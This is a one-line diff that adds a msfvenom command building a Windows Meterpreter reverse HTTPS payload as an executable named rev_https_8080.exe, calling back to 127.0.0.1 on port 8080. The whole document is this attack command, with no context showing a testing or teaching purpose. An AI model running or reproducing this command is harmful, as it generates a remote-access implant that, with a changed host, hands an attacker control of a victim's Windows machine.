@@ -1,0 +1,1 @@
+msfvenom --payload windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=8080 --format exe --out rev_https_8080.exe
